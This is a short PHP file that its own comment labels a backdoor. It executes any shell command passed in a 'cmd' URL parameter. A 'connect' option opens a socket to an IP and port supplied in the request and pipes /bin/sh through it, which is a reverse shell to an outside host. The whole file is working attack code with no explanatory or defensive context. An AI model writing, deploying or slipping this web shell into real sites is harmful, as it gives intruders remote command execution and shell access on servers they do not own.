<?php
// Simple PHP Backdoor with Command Execution and Backconnect

if (isset($_GET['cmd'])) {
    // Command execution
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}

if (isset($_GET['connect'])) {
    // Backconnect feature
    $ip = $_GET['ip']; // IP Address for backconnect
    $port = $_GET['port']; // Port for backconnect

    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
        echo "Failed to connect: $errstr ($errno)";
        exit(1);
    }

    $descriptorspec = array(
        0 => array("pipe", "r"), // STDIN
        1 => array("pipe", "w"), // STDOUT
        2 => array("pipe", "w")  // STDERR
    );

    $process = proc_open('/bin/sh', $descriptorspec, $pipes);
    if (is_resource($process)) {
        while (!feof($sock)) {
            fwrite($pipes[0], fread($sock, 2048));
            fwrite($sock, fread($pipes[1], 2048));
        }
        fclose($pipes[0]);
        fclose($pipes[1]);
        proc_close($process);
    }
    fclose($sock);
    exit;
}
?>
